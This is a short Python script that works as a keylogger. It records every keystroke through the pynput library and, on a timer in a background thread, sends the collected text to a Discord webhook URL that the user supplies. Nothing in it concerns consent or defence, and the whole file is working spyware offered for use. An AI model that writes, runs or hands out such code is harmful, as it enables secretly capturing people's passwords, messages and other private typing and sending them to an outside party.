# REQUIREMENTS
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook, webhook
import threading
import time

keystrokes=""
Webhook = "your discord webhook url"
Interval =60 #Mention your desired time in seconds

# Capturing keystrokes
def on_press (key):
  global keystrokes 
  keystrokes+="\n"+str(key)
  
# send collected keystrokes to discord for mentioned time interval  
def send_keystrokes ():
    global keystrokes
      
    while(1):
        if keystrokes=="": 
            continue
        webhook=DiscordWebhook(url=Webhook,content=keystrokes)
        response=webhook.execute()
        print("-----*SENT*-----")
        keystrokes=""
        time.sleep(Interval)
 
# Driver code 
if __name__=="__main__":
    t=threading.Thread(target=send_keystrokes,args=())# for multiprocessing
    t.daemon=True
    t.start()
    
# Listener    
    with Listener(on_press=on_press) as listener:
        listener.join()
 
